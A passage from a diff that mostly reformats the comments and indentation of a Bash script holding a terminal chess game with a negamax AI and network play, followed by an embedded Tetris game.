 					if dlg_settings=$(dlg --separate-output --checklist "$option_mainmenu_settings" $dlgh $dlgw $dlgw "${option_settings[0]}" "with movements and figures" $($color && echo $dlg_on || echo $dlg_off) "${option_settings[1]}" "optional including board labels" $($ascii && echo $dlg_off || echo $dlg_on) "${option_settings[2]}" "be chatty" $($warnings && echo $dlg_on || echo $dlg_off) "${option_settings[3]}" "be clicky" $($mouse && echo $dlg_on || echo $dlg_off) "${option_settings[4]}" "in a regluar file" $([[ -n "$cache" ]] && echo $dlg_on || echo $dlg_off) ) ; then
-						# Color support
+# Color support
 						if [[ "$dlg_settings" == *"${option_settings[0]}"* ]] ; then
 							color=true
 							dlg --yesno "Enable movement helper (colorize possible move)?" $dlgh $dlgw && colorHelper=true || colorHelper=false
@@ -1640,7 +1522,7 @@ if $guiconfig ; then
 							colorFill=false
 							colorHelper=false
 						fi
-						# Unicode support
+# Unicode support
 						if [[ "$dlg_settings" == *"${option_settings[1]}"* ]] ; then
 							ascii=false
 							( dlg --yesno "Use Unicode for board labels?" $dlgh $dlgw ) && unicodelabels=true || unicodelabels=false
@@ -1648,11 +1530,11 @@ if $guiconfig ; then
 							ascii=true
 							unicodelabels=false
 						fi
-						# Verbose messages
+# Verbose messages
 						[[ "$dlg_settings" == *"${option_settings[2]}"* ]] && warnings=true || warnings=false
-						# Mouse support
+# Mouse support
 						[[ "$dlg_settings" == *"${option_settings[3]}"* ]] && mouse=true || mouse=false
-						# AI Cache
+# AI Cache
 						local dlg_cache
 						if [[ "$dlg_settings" == *"${option_settings[4]}"* ]] && dlg_cache=$(dlg --inputbox "Cache file:" $dlgh $dlgw "$([[ -z "$cache" ]] && echo "$(pwd)/chessbash.cache" || echo "$cache")") && [[ -n "$dlg_cache" ]] ; then
 							cache="$dlg_cache"
@@ -1660,7 +1542,7 @@ if $guiconfig ; then
 						else
 							cache=""
 						fi
-						# Waiting time (ask always)
+# Waiting time (ask always)
 						local dlg_sleep
 						if dlg_sleep=$(dlg --inputbox "How long should every message be displayed (in seconds)?" $dlgh $dlgw "$sleep") ; then
 							if validNumber "$dlg_sleep" ; then
@@ -1671,7 +1553,7 @@ if $guiconfig ; then
 						fi
 					fi
 					;;
-				# Other --> exit (gdialog)
+# Other --> exit (gdialog)
 				* )
 					break
 					;;
@@ -1679,20 +1561,17 @@ if $guiconfig ; then
 		done
 	}
 
-	# start config dialog
+# start config dialog
 	dlgconfig
 fi
-
 # Save screen
 if $cursor ; then
 	echo -e "\e7\e[s\e[?47h\e[?25l\e[2J\e[H"
 fi
-
 # lookup tables
 declare -A cacheLookup
 declare -A cacheFlag
 declare -A cacheDepth
-
 # associative arrays are faster than numeric ones and way more readable
 declare -A redraw
 if $cursor ; then
@@ -1702,9 +1581,7 @@ if $cursor ; then
 		done
 	done
 fi
-
 declare -A field
-
 # initialize setting - first row
 declare -a initline=( 4  2  3  6  5  3  2  4 )
 for (( x=0; x<8; x++ )) ; do
@@ -1722,14 +1599,12 @@ for (( y=2; y<6; y++ )) ; do
 		field[$y,$x]=0
 	done
 done
-
 # readable figure names
 declare -a figNames=( "(empty)" "pawn" "knight" "bishop" "rook" "queen" "king" )
 # ascii figure names (for ascii output)
 declare -a asciiNames=( "k" "q" "r" "b" "n" "p" " " "P" "N" "B" "R" "Q" "K" )
 # figure weight (for heuristic)
 declare -a figValues=( 0 1 5 5 6 17 42 )
-
 # Warning message on invalid moves (Helper)
 # Params:
 #	$1	message
@@ -1738,7 +1613,6 @@ function warn() {
 	message="\e[41m\e[1m$1\e[0m\n"
 	draw
 }
-
 # Readable coordinates
 # Params:
 #	$1	row position
@@ -1747,7 +1621,6 @@ function warn() {
 function coord() {
 	echo -en "\x$((48-$1))$(($2+1))"
 }
-
 # Get name of player
 # Params:
 #	$1	player
@@ -1776,7 +1649,6 @@ function namePlayer() {
 		echo -en "\e[0m"
 	fi
 }
-
 # Get name of figure
 # Params:
 #	$1	figure
@@ -1788,7 +1660,6 @@ function nameFigure() {
 		echo -n "${figNames[$1]}"
 	fi
 }
-
 # Check win/loose position
 # (player has king?)
 # Params:
@@ -1807,7 +1678,6 @@ function hasKing() {
 	done
 	return 1
 }
-
 # Check validity of a concrete single movement
 # Params:
 #	$1	origin Y position
@@ -1832,16 +1702,16 @@ function canMove() {
 	local fig=$(( from * player ))
 	if (( from == 0 || from * player < 0 || to * player > 0 || player * player != 1 )) ; then
 		return 1
-	# pawn
+# pawn
 	elif (( fig == 1 )) ; then
 		if (( fromX == toX && to == 0 && ( toY - fromY == player || ( toY - fromY == 2 * player && ${field["$((player + fromY)),$fromX"]} == 0 && fromY == ( player > 0 ? 1 : 6 ) ) ) )) ; then
 				return 0
 			else
 				return $(( ! ( (fromX - toX) * (fromX - toX) == 1 && toY - fromY == player && to * player < 0 ) ))
 		fi
-	# queen, rock and bishop
+# queen, rock and bishop
 	elif (( fig == 5 || fig == 4  || fig == 3 )) ; then
-		# rock - and queen
+# rock - and queen
 		if (( fig != 3 )) ; then
 			if (( fromX == toX )) ; then
 				for (( i = ( fromY < toY ? fromY : toY ) + 1 ; i < ( fromY > toY ? fromY : toY ) ; i++ )) ; do
@@ -1859,7 +1729,7 @@ function canMove() {
 				return 0
 			fi
 		fi
-		# bishop - and queen
+# bishop - and queen
 		if (( fig != 4 )) ; then
 			if (( ( fromY - toY ) * ( fromY - toY ) != ( fromX - toX ) * ( fromX - toX ) )) ; then
 				return 1
@@ -1871,21 +1741,20 @@ function canMove() {
 			done
 			return 0
 		fi
-		# nothing found? wrong move.
+# nothing found? wrong move.
 		return 1
-	# knight
+# knight
 	elif (( fig == 2 )) ; then
 		return $(( ! ( ( ( fromY - toY == 2 || fromY - toY == -2) && ( fromX - toX == 1 || fromX - toX == -1 ) ) || ( ( fromY - toY == 1 || fromY - toY == -1) && ( fromX - toX == 2 || fromX - toX == -2 ) ) ) ))
-	# king
+# king
 	elif (( fig == 6 )) ; then
 		return $(( !( ( ( fromX - toX ) * ( fromX - toX ) ) <= 1 &&  ( ( fromY - toY ) * ( fromY - toY ) ) <= 1 ) ))
-	# invalid figure
+# invalid figure
 	else
 		error "Invalid figure '$from'!"
 		exit 1
 	fi
 }
-
 # minimax (game theory) algorithm for evaluate possible movements
 # (the heart of your computer enemy)
 # currently based on negamax with alpha/beta pruning and transposition tables liked described in
@@ -1903,7 +1772,7 @@ function negamax() {
 	local b=$3
 	local player=$4
 	local save=$5
-	# transposition table
+# transposition table
 	local aSave=$a
 	local hash
 	hash="$player ${field[@]}"
@@ -1921,13 +1790,13 @@ function negamax() {
 			return $value
 		fi
 	fi
-	# lost own king?
+# lost own king?
 	if ! hasKing "$player" ; then
 		cacheLookup[$hash]=$(( strength - depth + 1 ))
 		cacheDepth[$hash]=$depth
 		cacheFlag[$hash]=0
 		return $(( strength - depth + 1 ))
-	# use heuristics in depth
+# use heuristics in depth
 	elif (( depth <= 0 )) ; then
 		local values=0
 		for (( y=0; y<8; y++ )) ; do
@@ -1935,9 +1804,9 @@ function negamax() {
 				local fig=${field[$y,$x]}
 				if (( ${field[$y,$x]} != 0 )) ; then
 					local figPlayer=$(( fig < 0 ? -1 : 1 ))
-					# a more simple heuristic would be values=$(( $values + $fig ))
+# a more simple heuristic would be values=$(( $values + $fig ))
 					(( values += ${figValues[$fig * $figPlayer]} * figPlayer ))
-					# pawns near to end are better
+# pawns near to end are better
 					if (( fig == 1 )) ; then
 						if (( figPlayer > 0 )) ; then
 							(( values += ( y - 1 ) / 2 ))
@@ -1949,7 +1818,7 @@ function negamax() {
 			done
 		done
 		values=$(( 127 + ( player * values ) ))
-		# ensure valid bash return range
+# ensure valid bash return range
 		if (( values > 253 - strength )) ; then
 			values=$(( 253 - strength ))
 		elif (( values < 2 + strength )) ; then
@@ -1959,7 +1828,7 @@ function negamax() {
 		cacheDepth[$hash]=0
 		cacheFlag[$hash]=0
 		return $values
-	# calculate best move
+# calculate best move
 	else
 		local bestVal=0
 		local fromY
@@ -1971,14 +1840,14 @@ function negamax() {
 		for (( fromY=0; fromY<8; fromY++ )) ; do
 			for (( fromX=0; fromX<8; fromX++ )) ; do
 				local fig=$(( ${field[$fromY,$fromX]} * ( player ) ))
-				# precalc possible fields (faster then checking every 8*8 again)
+# precalc possible fields (faster then checking every 8*8 again)
 				local targetY=()
 				local targetX=()
 				local t=0
-				# empty or enemy
+# empty or enemy
 				if (( fig <= 0 )) ; then
 					continue
-				# pawn
+# pawn
 				elif (( fig == 1 )) ; then
 					targetY[$t]=$(( player + fromY ))
 					targetX[$t]=$(( fromX ))
@@ -1992,7 +1861,7 @@ function negamax() {
 					targetY[$t]=$(( player + fromY ))
 					targetX[$t]=$(( fromX - 1 ))
 					(( t += 1 ))
-				# knight
+# knight
 				elif (( fig == 2 )) ; then
 					for (( i=-1 ; i<=1 ; i=i+2 )) ; do
 						for (( j=-1 ; j<=1 ; j=j+2 )) ; do
@@ -2004,7 +1873,7 @@ function negamax() {
 							(( t + 1 ))
 						done
 					done
-				# king
+# king
 				elif (( fig == 6 )) ; then
 					for (( i=-1 ; i<=1 ; i++ )) ; do
 						for (( j=-1 ; j<=1 ; j++ )) ; do
@@ -2014,11 +1883,11 @@ function negamax() {
 						done
 					done
 				else
-					# bishop or queen
+# bishop or queen
 					if (( fig != 4 )) ; then
 						for (( i=-8 ; i<=8 ; i++ )) ; do
 							if (( i != 0 )) ; then
-								# can be done nicer but avoiding two loops!
+# can be done nicer but avoiding two loops!
 								targetY[$t]=$(( fromY + i ))
 								targetX[$t]=$(( fromX + i ))
 								(( t += 1 ))
@@ -2034,7 +1903,7 @@ function negamax() {
 							fi
 						done
 					fi
-					# rock or queen
+# rock or queen
 					if (( fig != 3 )) ; then
 						for (( i=-8 ; i<=8 ; i++ )) ; do
 							if (( i != 0 )) ; then
@@ -2054,21 +1923,21 @@ function negamax() {
 						done
 					fi
 				fi
-				# process all available moves
+# process all available moves
 				for (( j=0; j < t; j++ )) ; do
 					local toY=${targetY[$j]}
 					local toX=${targetX[$j]}
-					# move is valid
+# move is valid
 					if (( toY >= 0 && toY < 8 && toX >= 0 && toX < 8 )) &&  canMove "$fromY" "$fromX" "$toY" "$toX" "$player" ; then
 						local oldFrom=${field[$fromY,$fromX]};
 						local oldTo=${field[$toY,$toX]};
 						field[$fromY,$fromX]=0
 						field[$toY,$toX]=$oldFrom
-						# pawn to queen
+# pawn to queen
 						if (( oldFrom == player && toY == ( player > 0 ? 7 : 0 ) )) ;then
 							field["$toY,$toX"]=$(( 5 * player ))
 						fi
-						# recursion
+# recursion
 						negamax $(( depth - 1 )) $(( 255 - b )) $(( 255 - a )) $(( player * (-1) )) false
 						local val=$(( 255 - $? ))
 						field[$fromY,$fromX]=$oldFrom
@@ -2104,7 +1973,6 @@ function negamax() {
 		return $bestVal
 	fi
 }
-
 # Perform a concrete single movement
 # Params:
 # 	$1	current player
@@ -2120,7 +1988,7 @@ function move() {
 		local fig=${field[$selectedY,$selectedX]}
 		field[$selectedY,$selectedX]=0
 		field[$selectedNewY,$selectedNewX]=$fig
-		# pawn to queen
+# pawn to queen
 		if (( fig == player && selectedNewY == ( player > 0 ? 7 : 0 ) )) ; then
 			field[$selectedNewY,$selectedNewX]=$(( 5 * player ))
 		fi
@@ -2128,7 +1996,6 @@ function move() {
 	fi
 	return 1
 }
-
 # Unicode helper function (for draw)
 # Params:
 #	$1	first hex unicode character number
@@ -2141,7 +2008,6 @@ function unicode() {
 		printf '\\x%s\\x%s\\x%x' "$1" "$2" "$(( 0x$3 + ( $4 ) ))"
 	fi
 }
-
 # Ascii helper function (for draw)
 # Params:
 #	$1	decimal ascii character number
@@ -2149,7 +2015,6 @@ function unicode() {
 function ascii() {
 	echo -en "\x$1"
 }
-
 # Get ascii code number of character
 # Params:
 #	$1	ascii character
@@ -2157,7 +2022,6 @@ function ascii() {
 function ord() {
 	LC_CTYPE=C printf '%d' "'$1"
 }
-
 # Audio and visual bell
 # No params or return
 function bell() {
@@ -2168,7 +2032,6 @@ function bell() {
 		lastBell=$SECONDS
 	fi
 }
-
 # Draw one field (of the gameboard)
 # Params:
 #	$1	y coordinate
@@ -2179,7 +2042,7 @@ function drawField(){
 	local y=$1
 	local x=$2
 	echo -en "\e[0m"
-	# move coursor to absolute position
+# move coursor to absolute position
 	if $3 ; then
 		local yScr=$(( y + originY ))
 		local xScr=$(( x * 2 + originX ))
@@ -2188,7 +2051,7 @@ function drawField(){
 		fi
 		echo -en "\e[${yScr};${xScr}H"
 	fi
-	# draw vertical labels
+# draw vertical labels
 	if (( x==labelX && y >= 0 && y < 8)) ; then
 		if $hoverInit && (( hoverY == y )) ; then
 			if $color ; then
@@ -2205,14 +2068,14 @@ function drawField(){
 				echo -en "\e[3${colorPlayerB}m"
 			fi
 		fi
-		# line number (alpha numeric)
+# line number (alpha numeric)
 		if $unicodelabels ; then
 			echo -en "$(unicode e2 92 bd -$y) "
 		else
 			echo -en " \x$((48 - $y))"
 		fi
-		# clear format
-	# draw horizontal labels
+# clear format
+# draw horizontal labels
 	elif (( x>=0 && y==labelY )) ; then
 		if $hoverInit && (( hoverX == x )) ; then
 			if $color ; then
@@ -2239,14 +2102,14 @@ function drawField(){
 			fi
 			echo -en "\x$((31 + $x))\e[0m "
 		fi
-	# draw field
+# draw field
 	elif (( y >=0 && y < 8 && x >= 0 && x < 8 )) ; then
 		local f=${field["$y,$x"]}
 		local black=false
 		if (( ( x + y ) % 2 == 0 )) ; then
 			local black=true
 		fi
-		# black/white fields
+# black/white fields
 		if $black ; then
 			if $color ; then
 				echo -en "\e[47;107m"
@@ -2256,7 +2119,7 @@ function drawField(){
 		else
 			$color && echo -en "\e[40m"
 		fi
-		# background
+# background
 		if $hoverInit && (( hoverX == x && hoverY == y )) ; then
 			if ! $color ; then
 				echo -en "\e[4m"
@@ -2291,11 +2154,11 @@ function drawField(){
 				fi
 			fi
 		fi
-		# empty field?
+# empty field?
 		if ! $ascii && (( f == 0 )) ; then
 			echo -en "  "
 		else
-			# figure colors
+# figure colors
 			if $color ; then
 				if (( selectedX == x && selectedY == y )) ; then
 					if (( f < 0 )) ; then
@@ -2311,7 +2174,7 @@ function drawField(){
 					fi
 				fi
 			fi
-			# unicode figures
+# unicode figures
 			if $ascii ; then
 				echo -en " \e[1m${asciiNames[ $f + 6 ]} "
 			elif (( f > 0 )) ; then
@@ -2324,17 +2187,16 @@ function drawField(){
 				echo -en "$( unicode e2 99 a0 $f ) "
 			fi
 		fi
-	# three empty chars
+# three empty chars
 	elif $ascii && (( x >= 0 )) ; then
 		echo -n "   "
-	# otherwise: two empty chars (on unicode boards)
+# otherwise: two empty chars (on unicode boards)
 	else
 		echo -n "  "
 	fi
-	# clear format
+# clear format
 	echo -en "\e[0m\e[8m"
 }
-
 # Draw the battlefield
 # (no params / return value)
 function draw() {
@@ -2360,10 +2222,9 @@ function draw() {
 		$cursor || echo ""
 	done
 	$useStty && stty echo
-	# clear format
+# clear format
 	echo -en "\e[0m\e[$(( originY + 10 ));0H\e[2K\n\e[2K$message\e[8m"
 }
-
 # Read the next move coordinates
 # from keyboard (direct access or cursor keypad)
 # or use mouse input (if available)
@@ -2509,7 +2370,7 @@ function inputCoord(){
 				inputX=$(( a - 1 ))
 				hoverX=$inputX
 				;;
-			* )
+			*)
 				bell
 				;;
 		esac
@@ -2525,7 +2386,6 @@ function inputCoord(){
 	$useStty && stty -echo
 	return $ret
 }
-
 # Player input
 # (reads a valid user movement)
 # Params
@@ -2566,14 +2426,13 @@ function input() {
 					else
 						warn "This move is not allowed!" >&3
 					fi
-					# Same position again --> revoke
+# Same position again --> revoke
 					send "$player" "$selectedY" "$selectedX"
 				fi
 			fi
 		fi
 	done
 }
-
 # AI interaction
 # (calculating movement)
 # Params
@@ -2604,7 +2463,6 @@ function ai() {
 		error "AI produced invalid move - that should not hapen!"
 	fi
 }
-
 # Read row from remote
 # Returns row (0-7) as status code
 function receiveY() {
@@ -2627,7 +2485,6 @@ function receiveY() {
 		esac
 	done
 }
-
 # Read column from remote
 # Returns column (0-7) as status code
 function receiveX() {
@@ -2643,7 +2500,6 @@ function receiveX() {
 		esac
 	done
 }
-
 # receive movement from connected player
 # (no params/return value)
 function receive() {
@@ -2685,7 +2541,6 @@ function receive() {
 		error "Received invalid move from network - that should not hapen!"
 	fi
 }
-
 # Write coordinates to network
 # Params:
 #	$1	player
@@ -2703,7 +2558,6 @@ function send() {
 		sleep "$remotedelay"
 	fi
 }
-
 # Import transposition tables
 # by reading serialised cache from stdin
 # (no params / return value)
@@ -2714,7 +2568,6 @@ function importCache() {
 		cacheFlag["$hash"]=$flag
 	done
 }
-
 # Export transposition tables
 # Outputs serialised cache (to stdout)
 # (no params / return value)
@@ -2723,11 +2576,10 @@ function exportCache() {
 		echo -e "$hash\t${cacheLookup[$hash]}\t${cacheDepth[$hash]}\t${cacheFlag[$hash]}"
 	done
 }
-
 # Trap function for exporting cache
 # (no params / return value)
 function exitCache() {
-	# permanent cache: export
+# permanent cache: export
 	if [[ -n "$cache" ]] ; then
 		echo -en "\r\n\e[2mExporting cache..." >&3
 		if $cachecompress ; then
@@ -2738,34 +2590,31 @@ function exitCache() {
 		echo -e " done!\e[0m" >&3
 	fi
 }
-
 # Perform necessary tasks for exit
 # like deleting files and measuring runtime
 # (no params / return value)
 function end() {
-	# remove pipe
+# remove pipe
 	if [[ -n "$fifopipe" && -p "$fifopipe" ]] ; then
 		rm "$fifopipe"
 	fi
-	# disable mouse
+# disable mouse
 	if $mouse ; then
 		echo -en "\e[?9l"
 	fi
-	# enable input
+# enable input
 	stty echo
-	# restore screen
+# restore screen
 	if $cursor ; then
 		echo -en "\e[2J\e[?47l\e[?25h\e[u\e8"
 	fi
-	# exit message
+# exit message
 	duration=$(( $( date +%s%N ) - timestamp ))
 	seconds=$(( duration / 1000000000 ))
 	echo -e "\r\n\e[2mYou've wasted $seconds,$(( duration -( seconds * 1000000000 ))) seconds of your lifetime playing with a Bash script.\e[0m\n"
 }
-
 # Exit trap
 trap "end" 0
-
 # setting up requirements for network
 piper="cat"
 fifopipe="/dev/fd/1"
@@ -2807,17 +2656,16 @@ if [[ -n "$cache" && -f "$cache" ]] ; then
 	fi
 	echo -e " done\e[0m"
 fi
-
 # main game loop
 {
 	p=1
 	while true ; do
-		# initialize remote connection on first run
+# initialize remote connection on first run
 		if ! $initializedGameLoop ; then
-			# set cache export trap
+# set cache export trap
 			trap "exitCache" 0
 			warn "Waiting for the other network player to be ready..." >&3
-			# exchange names
+# exchange names
 			if (( remote == -1 )) ; then
 				read namePlayerA < $fifopipe
 				echo "$namePlayerB"
@@ -2827,17 +2675,17 @@ fi
 				read namePlayerB < $fifopipe
 				echo "connected with second player." >&3
 			fi
-			# set this loop initialized
+# set this loop initialized
 			initializedGameLoop=true
 		fi
-		# reset global variables
+# reset global variables
 		selectedY=-1
 		selectedX=-1
 		selectedNewY=-1
 		selectedNewX=-1
-		# switch current player
+# switch current player
 		(( p *= (-1) ))
-		# check check (or: if the king is lost)
+# check check (or: if the king is lost)
 		if hasKing "$p" ; then
 			if (( remote == p )) ; then
 				receive < $fifopipe
@@ -2858,8 +2706,7 @@ fi
 			exit 0
 		fi
 	done | $piper > "$fifopipe"
-
-	# check exit code
+# check exit code
 	netcatExit=$?
 	gameLoopExit=${PIPESTATUS[0]}
 	if (( netcatExit != 0 )) ; then
@@ -2869,11 +2716,9 @@ fi
 	fi
 } 3>&1
 }
-
 ##
 #   - Pass time tetris
 ##
-
 tetris_game() {
 # Tetris game written in pure bash
 #
@@ -2891,15 +2736,12 @@ tetris_game() {
 # Enjoy :-)!
 #
 # Author: Kirill Timofeev <kt97679@gmail.com>
-
 set -u # non initialized variable is an error
-
 # 2 signals are used: SIGUSR1 to decrease delay after level up and SIGUSR2 to quit
 # they are sent to all instances of this script
 # because of that we should process them in each instance
 # in this instance we are ignoring both signals
 trap '' SIGUSR1 SIGUSR2
-
 # Those are commands sent to controller by key press processing code
 # In controller they are used as index to retrieve actual functuon from array
 QUIT=0
@@ -2913,7 +2755,6 @@ TOGGLE_NEXT=7
 TOGGLE_COLOR=8
 DELAY=1          # initial delay between piece movements
 DELAY_FACTOR=0.8 # this value controld delay decrease for each level up
-
 # color codes
 RED=1
 GREEN=2
@@ -2922,32 +2763,26 @@ BLUE=4
 FUCHSIA=5
 CYAN=6
 WHITE=7
-
 # Location and size of playfield, color of border
 PLAYFIELD_W=10
 PLAYFIELD_H=20
 PLAYFIELD_X=30
 PLAYFIELD_Y=1
 BORDER_COLOR=$YELLOW
-
 # Location and color of score information
 SCORE_X=1
 SCORE_Y=2
 SCORE_COLOR=$GREEN
-
 # Location and color of help information
 HELP_X=58
 HELP_Y=1
 HELP_COLOR=$CYAN
-
 # Next piece location
 NEXT_X=14
 NEXT_Y=11
-
 # Location of "game over" in the end of the game
 GAMEOVER_X=1
 GAMEOVER_Y=$((PLAYFIELD_H + 3))
-
 # Intervals after which game level (and game speed) is increased 
 LEVEL_UP=20
 colors=($RED $GREEN $YELLOW $BLUE $FUCHSIA $CYAN $WHITE)
@@ -2958,92 +2793,81 @@ filled_cell="[]" # how we draw filled cell
 score=0           # score variable initialization
 level=1           # level variable initialization
 lines_completed=0 # completed lines counter initialization
-
 # screen_buffer is variable, that accumulates all screen changes
 # this variable is printed in controller once per game cycle
 puts() {
-    screen_buffer+=${1}
+	screen_buffer+=${1}
 }
-
 # move cursor to (x,y) and print string
 # (1,1) is upper left corner of the screen
 xyprint() {
-    puts "\033[${2};${1}H${3}"
+	puts "\033[${2};${1}H${3}"
 }
-
 show_cursor() {
-    echo -ne "\033[?25h"
+	echo -ne "\033[?25h"
 }
-
 hide_cursor() {
-    echo -ne "\033[?25l"
+	echo -ne "\033[?25l"
 }
-
 # foreground color
 set_fg() {
-    $no_color && return
-    puts "\033[3${1}m"
+	$no_color && return
+	puts "\033[3${1}m"
 }
-
 # background color
 set_bg() {
-    $no_color && return
-    puts "\033[4${1}m"
+	$no_color && return
+	puts "\033[4${1}m"
 }
-
 reset_colors() {
-    puts "\033[0m"
+	puts "\033[0m"
 }
-
 set_bold() {
-    puts "\033[1m"
+	puts "\033[1m"
 }
-
 # playfield is 1-dimensional array, data is stored as follows:
 # [ a11, a21, ... aX1, a12, a22, ... aX2, ... a1Y, a2Y, ... aXY]
 #   |<  1st line   >|  |<  2nd line   >|  ... |<  last line  >|
 # X is PLAYFIELD_W, Y is PLAYFIELD_H
 # each array element contains cell color value or -1 if cell is empty
 redraw_playfield() {
-    local j i x y xp yp
-    ((xp = PLAYFIELD_X))
-    for ((y = 0; y < PLAYFIELD_H; y++)) {
-        ((yp = y + PLAYFIELD_Y))
-        ((i = y * PLAYFIELD_W))
-        xyprint $xp $yp ""
-        for ((x = 0; x < PLAYFIELD_W; x++)) {
-            ((j = i + x))
-            if ((${play_field[$j]} == -1)) ; then
-                puts "$empty_cell"
-            else
-                set_fg ${play_field[$j]}
-                set_bg ${play_field[$j]}
-                puts "$filled_cell"
-                reset_colors
-            fi
-        }
-    }
+	local j i x y xp yp
+	((xp = PLAYFIELD_X))
+	for ((y = 0; y < PLAYFIELD_H; y++)) {
+		((yp = y + PLAYFIELD_Y))
+		((i = y * PLAYFIELD_W))
+		xyprint $xp $yp ""
+		for ((x = 0; x < PLAYFIELD_W; x++)) {
+		((j = i + x))
+		if ((${play_field[$j]} == -1)) ; then
+		puts "$empty_cell"
+		else
+		set_fg ${play_field[$j]}
+		set_bg ${play_field[$j]}
+		puts "$filled_cell"
+		reset_colors
+		fi
+		}
+	}
 }
-
 update_score() {
-    # Arguments: 1 - number of completed lines
-    ((lines_completed += $1))
-    # Unfortunately I don't know scoring algorithm of original tetris
-    # Here score is incremented with squared number of lines completed
-    # this seems reasonable since it takes more efforts to complete several lines at once
-    ((score += ($1 * $1)))
-    if (( score > LEVEL_UP * level)) ; then          # if level should be increased
-        ((level++))                                  # increment level
-        pkill -SIGUSR1 -f "/bin/bash $0" # and send SIGUSR1 signal to all instances of this script (please see ticker for more details)
-    fi
-    set_bold
-    set_fg $SCORE_COLOR
-    xyprint $SCORE_X $SCORE_Y         "Lines completed: $lines_completed"
-    xyprint $SCORE_X $((SCORE_Y + 1)) "Level:           $level"
-    xyprint $SCORE_X $((SCORE_Y + 2)) "Score:           $score"
-    reset_colors
+# Arguments: 1 - number of completed lines
+	((lines_completed += $1))
+# Unfortunately I don't know scoring algorithm of original tetris
+# Here score is incremented with squared number of lines completed
+# this seems reasonable since it takes more efforts to complete several lines at once
+	((score += ($1 * $1)))
+	if (( score > LEVEL_UP * level)) ; then          # if level should be increased
+		((level++))                                  # increment level
+		pkill -SIGUSR1 -f "/bin/bash $0" # and send SIGUSR1 signal to all instances of this script (please see ticker for more details)
+	fi
+	set_bold
+	set_fg $SCORE_COLOR
+	xyprint $SCORE_X $SCORE_Y         "Lines completed: $lines_completed"
+	xyprint $SCORE_X $((SCORE_Y + 1)) "Level:           $level"
+	xyprint $SCORE_X $((SCORE_Y + 2)) "Score:           $score"
+	reset_colors
 }
-
 help=(
 "  Use cursor keys"
 "       or"
@@ -3055,22 +2879,19 @@ help=(
 "n: toggle show next"
 "h: toggle this help"
 )
-
 help_on=-1 # if this flag is 1 help is shown
-
 toggle_help() {
-    local i s
-    set_bold
-    set_fg $HELP_COLOR
-    for ((i = 0; i < ${#help[@]}; i++ )) {
-        # ternary assignment: if help_on is 1 use string as is, otherwise substitute all characters with spaces
-        ((help_on == 1)) && s="${help[i]}" || s="${help[i]//?/ }"
-        xyprint $HELP_X $((HELP_Y + i)) "$s"
-    }
-    ((help_on = -help_on))
-    reset_colors
+	local i s
+	set_bold
+	set_fg $HELP_COLOR
+	for ((i = 0; i < ${#help[@]}; i++ )) {
+		# ternary assignment: if help_on is 1 use string as is, otherwise substitute all characters with spaces
+		((help_on == 1)) && s="${help[i]}" || s="${help[i]//?/ }"
+		xyprint $HELP_X $((HELP_Y + i)) "$s"
 }
-
+	((help_on = -help_on))
+	reset_colors
+}
 # this array holds all possible pieces that can be used in the game
 # each piece consists of 4 cells
 # each string is sequence of relative xy coordinates for different orientations
@@ -3084,321 +2905,282 @@ piece=(
 "01112122101112200001112102101112" # inverted L piece
 "01111221101112210110112101101112" # T piece
 )
-
 draw_piece() {
-    # Arguments:
-    # 1 - x, 2 - y, 3 - type, 4 - rotation, 5 - cell content
-    local i x y
-
-    # loop through piece cells: 4 cells, each has 2 coordinates
-    for ((i = 0; i < 8; i += 2)) {
-        # relative coordinates are retrieved based on orientation and added to absolute coordinates
-        ((x = $1 + ${piece[$3]:$((i + $4 * 8 + 1)):1} * 2))
-        ((y = $2 + ${piece[$3]:$((i + $4 * 8)):1}))
-        xyprint $x $y "$5"
-    }
+# Arguments:
+# 1 - x, 2 - y, 3 - type, 4 - rotation, 5 - cell content
+	local i x y
+# loop through piece cells: 4 cells, each has 2 coordinates
+	for ((i = 0; i < 8; i += 2)) {
+# relative coordinates are retrieved based on orientation and added to absolute coordinates
+		((x = $1 + ${piece[$3]:$((i + $4 * 8 + 1)):1} * 2))
+		((y = $2 + ${piece[$3]:$((i + $4 * 8)):1}))
+		xyprint $x $y "$5"
 }
-
+}
 next_piece=0
 next_piece_rotation=0
 next_piece_color=0
 next_on=1 # if this flag is 1 next piece is shown
-
 draw_next() {
-    # Arguments: 1 - string to draw single cell
-    ((next_on == -1)) && return
-    draw_piece $NEXT_X $NEXT_Y $next_piece $next_piece_rotation "$1"
+# Arguments: 1 - string to draw single cell
+	((next_on == -1)) && return
+	draw_piece $NEXT_X $NEXT_Y $next_piece $next_piece_rotation "$1"
 }
-
 clear_next() {
-    draw_next "${filled_cell//?/ }"
+	draw_next "${filled_cell//?/ }"
 }
-
 show_next() {
-    set_fg $next_piece_color
-    set_bg $next_piece_color
-    draw_next "${filled_cell}"
-    reset_colors
+	set_fg $next_piece_color
+	set_bg $next_piece_color
+	draw_next "${filled_cell}"
+	reset_colors
 }
-
 toggle_next() {
-    case $next_on in
-        1) clear_next; next_on=-1 ;;
-        -1) next_on=1; show_next ;;
-    esac
+	case $next_on in
+		1) clear_next; next_on=-1 ;;
+		-1) next_on=1; show_next ;;
+	esac
 }
-
 draw_current() {
-    # Arguments: 1 - string to draw single cell
-    # factor 2 for x because each cell is 2 characters wide
-    draw_piece $((current_piece_x * 2 + PLAYFIELD_X)) $((current_piece_y + PLAYFIELD_Y)) $current_piece $current_piece_rotation "$1"
+# Arguments: 1 - string to draw single cell
+# factor 2 for x because each cell is 2 characters wide
+	draw_piece $((current_piece_x * 2 + PLAYFIELD_X)) $((current_piece_y + PLAYFIELD_Y)) $current_piece $current_piece_rotation "$1"
 }
-
 show_current() {
-    set_fg $current_piece_color
-    set_bg $current_piece_color
-    draw_current "${filled_cell}"
-    reset_colors
+	set_fg $current_piece_color
+	set_bg $current_piece_color
+	draw_current "${filled_cell}"
+	reset_colors
 }
-
 clear_current() {
-    draw_current "${empty_cell}"
+	draw_current "${empty_cell}"
 }
-
 new_piece_location_ok() {
-    # Arguments: 1 - new x coordinate of the piece, 2 - new y coordinate of the piece
-    # test if piece can be moved to new location
-    local j i x y x_test=$1 y_test=$2
-
-    for ((j = 0, i = 1; j < 8; j += 2, i = j + 1)) {
-        ((y = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + y_test)) # new y coordinate of piece cell
-        ((x = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + x_test)) # new x coordinate of piece cell
-        ((y < 0 || y >= PLAYFIELD_H || x < 0 || x >= PLAYFIELD_W )) && return 1         # check if we are out of the play field
-        ((${play_field[y * PLAYFIELD_W + x]} != -1 )) && return 1                       # check if location is already ocupied
-    }
-    return 0
+# Arguments: 1 - new x coordinate of the piece, 2 - new y coordinate of the piece
